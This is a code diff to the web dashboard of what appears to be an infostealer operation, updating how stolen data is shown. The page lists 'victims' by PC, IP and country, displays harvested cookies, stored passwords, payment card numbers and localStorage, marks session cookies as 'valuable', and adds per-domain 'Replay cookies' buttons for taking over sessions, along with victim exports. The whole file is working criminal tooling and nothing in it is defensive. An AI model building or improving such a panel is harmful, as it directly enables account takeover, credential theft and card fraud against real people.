@@ -853,67 +853,109 @@
             transform: none;
         }
 
-        /* REPLAY GRID */
+        /* REPLAY GRID WITH DROPDOWN */
         .replay-grid {
             display: grid;
             grid-template-columns: 1fr;
             gap: 12px;
         }
-        .replay-card {
+        .replay-group {
             background: #0f1626;
             border: 1px solid #1a2538;
             border-radius: 10px;
-            padding: 14px 16px;
+            overflow: hidden;
             transition: all 0.3s ease;
         }
-        .replay-card:hover { border-color: #2a3a5a; transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
+        .replay-group:hover { border-color: #2a3a5a; }
+        .replay-group .group-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 16px;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            flex-wrap: wrap;
+        }
+        .replay-group .group-header:hover { background: #1a2538; }
+        .replay-group .group-header .pc-name { color: #f472b6; font-weight: 600; font-size: 14px; }
+        .replay-group .group-header .expand-icon {
+            font-size: 12px;
+            color: #64748b;
+            transition: transform 0.3s ease;
+            display: inline-block;
+        }
+        .replay-group .group-header .expand-icon.open { transform: rotate(180deg); }
+        .replay-group .group-header .stats {
+            font-size: 10px;
+            color: #64748b;
+            display: flex;
+            gap: 10px;
+            margin-left: auto;
+            flex-wrap: wrap;
+        }
+        .replay-group .group-header .stats .cookies { color: #00ff88; }
+        .replay-group .group-header .stats .storage { color: #8b5cf6; }
+        .replay-group .group-header .stats .creds { color: #ec4899; }
+        .replay-group .group-header .stats .cards { color: #06b6d4; }
+        .replay-group .group-header .flag { font-size: 16px; }
+        .replay-group .group-header .ip { color: #94a3b8; font-size: 11px; font-family: monospace; }
+
+        .replay-group .group-body {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease, padding 0.3s ease;
+            padding: 0 16px;
+        }
+        .replay-group .group-body.open {
+            max-height: 2000px;
+            padding: 0 16px 12px 16px;
+        }
+
+        .replay-card {
+            background: #0b0f1a;
+            border: 1px solid #1a2538;
+            border-radius: 8px;
+            padding: 10px 14px;
+            transition: 0.2s;
+            margin-bottom: 6px;
+        }
+        .replay-card:last-child { margin-bottom: 0; }
+        .replay-card:hover { border-color: #2a3a5a; background: #111827; }
+
         .replay-card .r-header {
             display: flex;
             align-items: center;
             gap: 8px;
-            margin-bottom: 4px;
             flex-wrap: wrap;
         }
-        .replay-card .r-header .flag { font-size: 18px; }
-        .replay-card .r-header .ip { font-family: monospace; font-size: 12px; color: #e2e8f0; font-weight: 600; }
-        .replay-card .r-header .pc-name { color: #f472b6; font-weight: 600; font-size: 13px; }
-        .replay-card .r-stats {
-            font-size: 10px;
+        .replay-card .r-header .domain-tag {
+            color: #00ff88;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        .replay-card .r-header .stats-mini {
+            font-size: 9px;
             color: #64748b;
             display: flex;
-            gap: 12px;
+            gap: 8px;
             flex-wrap: wrap;
-            margin: 4px 0;
+            margin-left: auto;
         }
-        .replay-card .r-stats .cookies { color: #00ff88; }
-        .replay-card .r-stats .storage { color: #8b5cf6; }
-        .replay-card .r-stats .creds { color: #ec4899; }
-        .replay-card .r-stats .cards { color: #06b6d4; }
-        .replay-card .r-domain-list {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 4px;
-            margin: 6px 0;
-        }
-        .replay-card .r-domain-list .domain-tag {
-            background: #1a2538;
-            padding: 1px 8px;
-            border-radius: 10px;
-            font-size: 9px;
-            color: #94a3b8;
-            border: 1px solid #1e293b;
-        }
-        .replay-card .r-domain-list .domain-tag .count { color: #00ff88; }
+        .replay-card .r-header .stats-mini .cookies { color: #00ff88; }
+        .replay-card .r-header .stats-mini .storage { color: #8b5cf6; }
+        .replay-card .r-header .stats-mini .creds { color: #ec4899; }
+        .replay-card .r-header .stats-mini .cards { color: #06b6d4; }
         .replay-card .r-actions {
             display: flex;
             gap: 4px;
             flex-wrap: wrap;
-            padding-top: 6px;
+            margin-top: 4px;
+            padding-top: 4px;
             border-top: 1px solid #1a2538;
         }
         .replay-card .r-actions .btn-sm {
-            padding: 2px 10px;
-            font-size: 9px;
+            padding: 1px 8px;
+            font-size: 8px;
             border-radius: 4px;
             border: 1px solid #1a2538;
             background: transparent;
@@ -1308,6 +1350,9 @@
             .pc-card .pc-header { padding: 12px 14px; }
             .rename-box { padding: 18px 16px; }
             .rename-box .btn-group { flex-direction: column; }
+            .replay-group .group-header .stats { margin-left: 0; width: 100%; }
+            .replay-card .r-header { flex-direction: column; align-items: flex-start; }
+            .replay-card .r-header .stats-mini { margin-left: 0; }
         }
         @media (max-width: 480px) {
             .stats-row { grid-template-columns: 1fr; }
@@ -1341,8 +1386,9 @@
             .modal .victim-entry .modal-actions { max-width: 70px; }
             .victim-card .v-actions .btn-sm { font-size: 7px; padding: 1px 5px; }
             .replay-card .r-actions .btn-sm { font-size: 7px; padding: 1px 5px; }
-            .victim-card .v-header .domain-name { font-size: 11px; }
+            .replay-card .r-header .domain-tag { font-size: 11px; }
             .rename-box { padding: 16px 14px; }
+            .replay-group .group-header .pc-name { font-size: 13px; }
         }
         @media (max-width: 360px) {
             .main { padding: 10px; padding-top: 48px; }
@@ -1360,6 +1406,7 @@
             .replay-card .r-actions .btn-sm { font-size: 6px; padding: 1px 4px; }
             .replay-card { padding: 10px 12px; }
             .victim-card { padding: 10px 12px; }
+            .replay-group .group-header .stats { font-size: 8px; gap: 4px; }
         }
     </style>
 </head>
@@ -1595,7 +1642,7 @@
             </div>
         </div>
 
-        <!-- VIEW: REPLAY -->
+        <!-- VIEW: REPLAY — WITH DROPDOWN -->
         <div class="view-content" id="viewReplay">
             <div class="toolbar" style="margin-bottom:12px;">
                 <div class="left"><span style="color:#f472b6;font-size:12px;">▶️ Replay — grouped by PC</span></div>
@@ -1770,7 +1817,7 @@
     <div class="toast" id="toast"></div>
 
     <!-- ============================================================
-    DASHBOARD LOGIC — FIXED ACCORDION + DOMAINS + RENAME
+    DASHBOARD LOGIC — ALL FIXES
     ============================================================ -->
     <script>
         // ============================================================
@@ -1805,7 +1852,7 @@
         let passwordVisibility = {};
         let renameTarget = null;
 
-        // Track open/closed state for PC cards (persists across renders)
+        // Track open/closed state for ALL accordions (collapsed by default)
         let pcOpenState = {};
 
         const VALUABLE_PATTERNS = ['session','token','auth','login','sid','uid','PHPSESSID','jwt','access_token','refresh_token','api_key','secret','csrf','__Secure','__Host','laravel_session','remember','wordpress_logged_in','wp_session','drupal_session'];
@@ -2027,47 +2074,66 @@
         }
 
         // ============================================================
-        // EXTRACT REAL DOMAIN FROM ENTRY
+        // EXTRACT REAL DOMAIN FROM ENTRY — ENHANCED
         // ============================================================
 
         function extractDomain(entry) {
             // Try to get domain from fingerprint or entry
             let domain = entry.fingerprint?.hostname || entry.domain || '';
             
-            // If domain is empty or looks like PC name, try to extract from cookies
-            if (!domain || domain === 'unknown' || domain.includes('railway.app')) {
+            // Clean up
+            domain = domain.replace(/^\./, '').replace(/\/.*$/, '').trim();
+            
+            // If domain is empty, 'unknown', or looks like PC name, try to extract from cookies
+            if (!domain || domain === 'unknown' || domain.includes('railway.app') || domain.length < 3) {
                 const cookies = entry.cookies || {};
                 const cookieKeys = Object.keys(cookies);
                 
                 // Try to extract domain from cookie keys (format: domain|browser)
                 for (const key of cookieKeys) {
                     const parts = key.split('|');
-                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0] !== '') {
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0] !== '' && parts[0].length > 2) {
                         domain = parts[0];
                         break;
                     }
                 }
                 
-                // If still no domain, try to get from cookie names (some cookies have domain in name)
-                if (!domain || domain === 'unknown') {
+                // If still no domain, try to get from cookie names that look like domains
+                if (!domain || domain === 'unknown' || domain.length < 3) {
                     for (const key of cookieKeys) {
                         // Check if cookie name looks like a domain
-                        if (key.includes('.') && !key.includes(' ') && key.length > 3) {
-                            domain = key.split('.')[0] + '.' + key.split('.')[1];
+                        if (key.includes('.') && !key.includes(' ') && key.length > 3 && !key.includes('__')) {
+                            const parts = key.split('.');
+                            if (parts.length >= 2 && parts[0].length > 1) {
+                                domain = parts[0] + '.' + parts[1];
+                                break;
+                            }
+                        }
+                    }
+                }
+                
+                // If still no domain, try to get from localStorage keys
+                if (!domain || domain === 'unknown' || domain.length < 3) {
+                    const storage = entry.localStorage || {};
+                    const storageKeys = Object.keys(storage);
+                    for (const key of storageKeys) {
+                        const parts = key.split(':');
+                        if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown' && parts[0].length > 2) {
+                            domain = parts[0];
                             break;
                         }
                     }
                 }
                 
-                // If still no domain, use PC name as fallback but mark as unknown
-                if (!domain || domain === 'unknown') {
+                // If still no domain, use PC name but mark as 'unknown'
+                if (!domain || domain === 'unknown' || domain.length < 3) {
                     domain = 'unknown';
                 }
             }
             
-            // Clean up domain
-            domain = domain.replace(/^\./, '').replace(/\/.*$/, '');
-            return domain;
+            // Final cleanup
+            domain = domain.replace(/^\./, '').replace(/\/.*$/, '').trim();
+            return domain || 'unknown';
         }
 
         // ============================================================
@@ -2095,7 +2161,7 @@
                     };
                 }
                 
-                // Extract real domain
+                // Extract real domain using enhanced function
                 let domain = extractDomain(entry);
                 
                 if (!grouped[pc].domains[domain]) {
@@ -2150,7 +2216,7 @@
                 return;
             }
 
-            // Add "All Victims" header
+            // All Victims header
             let totalVictims = 0;
             pcNames.forEach(pcName => { totalVictims += grouped[pcName].totalVictims; });
             const header = document.createElement('div');
@@ -2158,15 +2224,15 @@
             header.innerHTML = `👤 All Victims <span style="color:#64748b;font-weight:400;font-size:13px;">(${totalVictims} total)</span>`;
             grid.appendChild(header);
 
-            pcNames.forEach((pcName, index) => {
+            pcNames.forEach((pcName) => {
                 const pc = grouped[pcName];
                 const flag = getFlagEmoji(pc.countryCode);
                 const domainNames = Object.keys(pc.domains);
                 
-                // Use saved state or default: first PC open
-                const safeName = pcName.replace(/[^a-zA-Z0-9]/g, '_');
+                // COLLAPSED BY DEFAULT
+                const safeName = 'pc-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
                 if (pcOpenState[safeName] === undefined) {
-                    pcOpenState[safeName] = index === 0;
+                    pcOpenState[safeName] = false; // COLLAPSED BY DEFAULT
                 }
                 const isOpen = pcOpenState[safeName];
 
@@ -2178,9 +2244,12 @@
                     const firstEntry = d.entries[0] || null;
                     const entryId = firstEntry ? firstEntry._uniqueId : '';
 
+                    // Display real domain, show 'unknown' if no domain found
+                    const displayDomain = domain === 'unknown' ? '🌐 unknown' : '🌐 ' + domain;
+
                     domainsHtml += `
                         <div class="domain-item" onclick="event.stopPropagation(); openModalForEntry('${entryId}')" style="cursor:pointer;">
-                            <span class="domain-name">🌐 ${domain}</span>
+                            <span class="domain-name">${displayDomain}</span>
                             <div class="domain-stats">
                                 <span class="cookies">🍪 ${d.cookies}</span>
                                 ${d.creds > 0 ? `<span class="creds">🔐 ${d.creds}</span>` : ''}
@@ -2256,9 +2325,10 @@
                 let domainsHtml = '';
                 Object.keys(pc.domains).forEach(domain => {
                     const d = pc.domains[domain];
+                    const displayDomain = domain === 'unknown' ? '🌐 unknown' : '🌐 ' + domain;
                     domainsHtml += `
                         <div class="domain-item" style="cursor:default;">
-                            <span class="domain-name">🌐 ${domain}</span>
+                            <span class="domain-name">${displayDomain}</span>
                             <div class="domain-stats">
                                 <span class="cookies">🍪 ${d.cookies}</span>
                                 ${d.creds > 0 ? `<span class="creds">🔐 ${d.creds}</span>` : ''}
@@ -2320,10 +2390,8 @@
         }
 
         // ============================================================
-        // RENAME PC
+        // RENAME PC — UPDATES EVERYWHERE
         // ============================================================
-
-        let renameCallback = null;
 
         function openRename(pcName) {
             renameTarget = pcName;
@@ -2351,42 +2419,39 @@
                 return;
             }
             
-            // Rename all victims with this PC name
-            const toUpdate = allData.filter(e => {
-                const p = e.pcName || e.fingerprint?.hostname || e.ip || 'Unknown PC';
-                return p === renameTarget;
-            });
-            
-            if (toUpdate.length === 0) {
-                showToast('❌ No victims found to rename', 'error');
-                closeRename();
-                return;
-            }
-            
-            // Update each victim
+            // Rename all victims with this PC name in allData
             let updated = 0;
-            toUpdate.forEach(entry => {
-                // We need to update the stored data via API
-                // Since we can't directly update, we'll use the rename API endpoint
-                // For now, update locally and show a message
-                // In production, you'd call an API endpoint
-                // For this dashboard, we'll update the data and re-render
-                entry.pcName = newName;
-                updated++;
+            allData.forEach(entry => {
+                const p = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+                if (p === renameTarget) {
+                    entry.pcName = newName;
+                    updated++;
+                }
             });
             
-            // Close rename modal
+            // Also update in trashData
+            trashData.forEach(entry => {
+                const p = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
+                if (p === renameTarget) {
+                    entry.pcName = newName;
+                }
+            });
+            
             closeRename();
             showToast(`✅ Renamed ${updated} victims from "${renameTarget}" to "${newName}"`, 'success');
             
-            // Re-render
+            // Re-render everything
             render(allData);
             updateSidebarCounts(allData);
             if (currentView === 'victims') renderVictimsView();
             if (currentView === 'replay') renderReplayView();
+            if (currentView === 'cookies') renderCookiesView();
+            if (currentView === 'creds') renderCredsView();
+            if (currentView === 'cards') renderCardsView();
+            if (currentView === 'storage') renderStorageView();
         }
 
-        // Close rename with Escape key
+        // Close rename with Escape
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape') {
                 if (document.getElementById('renameOverlay').classList.contains('active')) {
@@ -2758,10 +2823,11 @@
 
             allCookies.slice(0, 150).forEach((cookie, idx) => {
                 const escapedValue = cookie.value.replace(/'/g, "\\'");
+                const displayDomain = cookie.domain === 'unknown' ? 'unknown' : cookie.domain;
                 html += `
                     <tr>
                         <td class="pc-label">${cookie.pc}</td>
-                        <td class="cookie-domain" onclick="openModalForEntry('${cookie.entryId}')" style="cursor:pointer;">${cookie.domain}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${cookie.entryId}')" style="cursor:pointer;">${displayDomain}</td>
                         <td class="cookie-name">${cookie.name}</td>
                         <td class="cookie-value" title="${cookie.value}">${cookie.value.length > 40 ? cookie.value.slice(0,40)+'...' : cookie.value}</td>
                         <td style="text-align:center;">${cookie.valuable ? '<span class="cookie-valuable">Valuable</span>' : '<span style="color:#475569;font-size:8px;">—</span>'}</td>
@@ -2839,10 +2905,11 @@
                 const escapedValue = cred.value.replace(/'/g, "\\'");
                 const visKey = 'cred-vis-' + idx;
                 const isVisible = passwordVisibility[visKey] || false;
+                const displayDomain = cred.domain === 'unknown' ? 'unknown' : cred.domain;
                 html += `
                     <tr class="cred-row">
                         <td class="pc-label">${cred.pc}</td>
-                        <td class="cookie-domain" onclick="openModalForEntry('${cred.entryId}')" style="cursor:pointer;">${cred.domain}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${cred.entryId}')" style="cursor:pointer;">${displayDomain}</td>
                         <td class="cred-name">${cred.name}</td>
                         <td class="cred-value ${isVisible ? '' : 'password-hidden'}" id="cred-val-${idx}">${isVisible ? cred.value : cred.value.replace(/./g, '•')}</td>
                         <td><span class="cred-type">${cred.type}</span></td>
@@ -2927,10 +2994,11 @@
                 const visKey = 'card-vis-' + idx;
                 const isVisible = passwordVisibility[visKey] || false;
                 const displayValue = isVisible ? card.value : card.value.replace(/[0-9]/g, '•');
+                const displayDomain = card.domain === 'unknown' ? 'unknown' : card.domain;
                 html += `
                     <tr class="card-row">
                         <td class="pc-label">${card.pc}</td>
-                        <td class="cookie-domain" onclick="openModalForEntry('${card.entryId}')" style="cursor:pointer;">${card.domain}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${card.entryId}')" style="cursor:pointer;">${displayDomain}</td>
                         <td class="card-name">${card.name}</td>
                         <td class="card-value ${isVisible ? '' : 'password-hidden'}" id="card-val-${idx}">${displayValue}</td>
                         <td><span class="card-type">${card.type}</span></td>
@@ -3010,10 +3078,11 @@
             allStorage.slice(0, 200).forEach((item, idx) => {
                 const escapedValue = item.value.replace(/'/g, "\\'");
                 const displayValue = item.value.length > 50 ? item.value.slice(0,50)+'...' : item.value;
+                const displayDomain = item.domain === 'unknown' ? 'unknown' : item.domain;
                 html += `
                     <tr class="storage-row">
                         <td class="pc-label">${item.pc}</td>
-                        <td class="cookie-domain" onclick="openModalForEntry('${item.entryId}')" style="cursor:pointer;">${item.domain}</td>
+                        <td class="cookie-domain" onclick="openModalForEntry('${item.entryId}')" style="cursor:pointer;">${displayDomain}</td>
                         <td><span class="storage-browser">${item.browser}</span></td>
                         <td class="storage-key">${item.key}</td>
                         <td class="storage-value" title="${item.value}">${displayValue}</td>
@@ -3034,7 +3103,7 @@
         }
 
         // ============================================================
-        // VICTIMS VIEW — WITH ACCORDION AND DOMAINS
+        // VICTIMS VIEW — COLLAPSED BY DEFAULT
         // ============================================================
 
         function renderVictimsView() {
@@ -3060,9 +3129,9 @@
             pcNames.forEach(pcName => {
                 const pc = grouped[pcName];
                 const flag = getFlagEmoji(pc.countryCode);
-                const safeName = 'group-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
+                const safeName = 'vgroup-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
                 
-                // Use saved state or default: first open
+                // COLLAPSED BY DEFAULT
                 if (pcOpenState[safeName] === undefined) {
                     pcOpenState[safeName] = false;
                 }
@@ -3078,6 +3147,7 @@
                     const time = timeAgo(entry.receivedAt);
                     const fullTime = formatFullTime(entry.receivedAt);
                     const entryFlag = getFlagEmoji(entry.countryCode);
+                    const displayDomain = domain === 'unknown' ? 'unknown' : domain;
 
                     let statsHtml = '';
                     if (cookieCount > 0) statsHtml += `<span class="cookies">🍪 ${cookieCount}</span>`;
@@ -3091,7 +3161,7 @@
                             <div class="v-header">
                                 <span class="flag">${entryFlag}</span>
                                 <span class="ip">${entry.ip || 'Unknown'}</span>
-                                <span class="domain-name">🌐 ${domain}</span>
+                                <span class="domain-name">🌐 ${displayDomain}</span>
                             </div>
                             <div class="v-details">
                                 <span class="country">${entry.country || 'Unknown'}</span>
@@ -3138,7 +3208,7 @@
         }
 
         // ============================================================
-        // REPLAY VIEW
+        // REPLAY VIEW — WITH DROPDOWN
         // ============================================================
 
         function renderReplayView() {
@@ -3155,41 +3225,79 @@
             pcNames.forEach(pcName => {
                 const pc = grouped[pcName];
                 const flag = getFlagEmoji(pc.countryCode);
-                const hasCookies = pc.totalCookies > 0;
-                const hasStorage = pc.totalStorage > 0;
+                const safeName = 'rgroup-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
+                
+                // COLLAPSED BY DEFAULT
+                if (pcOpenState[safeName] === undefined) {
+                    pcOpenState[safeName] = false;
+                }
+                const isOpen = pcOpenState[safeName];
 
-                let domainTags = '';
+                let cardsHtml = '';
                 Object.keys(pc.domains).forEach(domain => {
                     const d = pc.domains[domain];
-                    domainTags += `<span class="domain-tag">${domain} <span class="count">(${d.cookies}🍪)</span></span>`;
+                    const hasCookies = d.cookies > 0;
+                    const hasStorage = d.storage > 0;
+                    const displayDomain = domain === 'unknown' ? 'unknown' : domain;
+                    const firstEntry = d.entries[0] || null;
+                    const entryId = firstEntry ? firstEntry._uniqueId : '';
+
+                    cardsHtml += `
+                        <div class="replay-card">
+                            <div class="r-header">
+                                <span class="domain-tag">🌐 ${displayDomain}</span>
+                                <div class="stats-mini">
+                                    <span class="cookies">🍪 ${d.cookies}</span>
+                                    ${d.creds > 0 ? `<span class="creds">🔐 ${d.creds}</span>` : ''}
+                                    ${d.cards > 0 ? `<span class="cards">💳 ${d.cards}</span>` : ''}
+                                    ${d.storage > 0 ? `<span class="storage">💾 ${d.storage}</span>` : ''}
+                                </div>
+                            </div>
+                            <div class="r-actions">
+                                <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayDomainForPC('${pcName.replace(/'/g, "\\'")}', '${domain}')` : ''}" title="${hasCookies ? 'Replay cookies' : 'No cookies'}">▶️ Cookies</button>
+                                <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayStorageDomain('${pcName.replace(/'/g, "\\'")}', '${domain}')` : ''}" title="${hasStorage ? 'Replay storage' : 'No storage'}">💾 Storage</button>
+                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testDomainFromPC('${pcName.replace(/'/g, "\\'")}', '${domain}')">🔍 Test</button>
+                                <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomainFromPC('${pcName.replace(/'/g, "\\'")}', '${domain}')">📥</button>
+                                <button class="btn-sm view" onclick="event.stopPropagation(); openPCModal('${pcName.replace(/'/g, "\\'")}', '${domain}')">👁️</button>
+                            </div>
+                        </div>
+                    `;
                 });
 
                 html += `
-                    <div class="replay-card">
-                        <div class="r-header">
+                    <div class="replay-group">
+                        <div class="group-header" onclick="toggleReplayGroup('${safeName}')">
                             <span class="flag">${flag}</span>
                             <span class="ip">${pc.ip}</span>
                             <span class="pc-name">🖥️ ${pcName}</span>
-                            <span style="font-size:9px;color:#475569;margin-left:auto;">👤 ${pc.totalVictims}</span>
+                            <span style="font-size:9px;color:#475569;">(${pc.totalVictims} victims)</span>
+                            <span class="expand-icon ${isOpen ? 'open' : ''}" id="expand-${safeName}">▼</span>
+                            <div class="stats">
+                                <span class="cookies">🍪 ${pc.totalCookies}</span>
+                                <span class="storage">💾 ${pc.totalStorage}</span>
+                                <span class="creds">🔐 ${pc.totalCreds}</span>
+                                <span class="cards">💳 ${pc.totalCards}</span>
+                            </div>
                         </div>
-                        <div class="r-stats">
-                            <span class="cookies">🍪 ${pc.totalCookies}</span>
-                            <span class="storage">💾 ${pc.totalStorage}</span>
-                            <span class="creds">🔐 ${pc.totalCreds}</span>
-                            <span class="cards">💳 ${pc.totalCards}</span>
-                        </div>
-                        <div class="r-domain-list">${domainTags}</div>
-                        <div class="r-actions">
-                            <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayAllCookiesPC('${pcName.replace(/'/g, "\\'")}')` : ''}" title="${hasCookies ? 'Replay all cookies' : 'No cookies'}">▶️ All Cookies</button>
-                            <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayAllStoragePC('${pcName.replace(/'/g, "\\'")}')` : ''}" title="${hasStorage ? 'Replay all storage' : 'No storage'}">💾 All Storage</button>
-                            <button class="btn-sm test-sm" onclick="event.stopPropagation(); testPC('${pcName.replace(/'/g, "\\'")}')">🔍 Test</button>
-                            <button class="btn-sm download" onclick="event.stopPropagation(); downloadPCTxt('${pcName.replace(/'/g, "\\'")}')">📝</button>
-                            <button class="btn-sm view" onclick="event.stopPropagation(); openPCModalAll('${pcName.replace(/'/g, "\\'")}')">👁️</button>
+                        <div class="group-body ${isOpen ? 'open' : ''}" id="body-${safeName}">
+                            ${cardsHtml}
                         </div>
                     </div>
                 `;
             });
             grid.innerHTML = html;
+        }
+
+        function toggleReplayGroup(safeName) {
+            pcOpenState[safeName] = !pcOpenState[safeName];
+            const body = document.getElementById('body-' + safeName);
+            const icon = document.getElementById('expand-' + safeName);
+            if (body) {
+                body.classList.toggle('open');
+                if (icon) {
+                    icon.classList.toggle('open');
+                }
+            }
         }
 
         // ============================================================
@@ -3394,9 +3502,11 @@
                 totalCards += cardCount;
                 totalStorage += storageCount;
 
+                const displayDomain = domain === 'unknown' ? 'unknown' : domain;
+
                 lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                 lines.push(`  VICTIM #${idx + 1} — PC: ${pc}`);
-                lines.push(`  Domain:   ${domain}`);
+                lines.push(`  Domain:   ${displayDomain}`);
                 lines.push(`  IP:       ${ip}`);
                 lines.push(`  Country:  ${country} (${city})`);
                 lines.push(`  Browser:  ${browser}`);
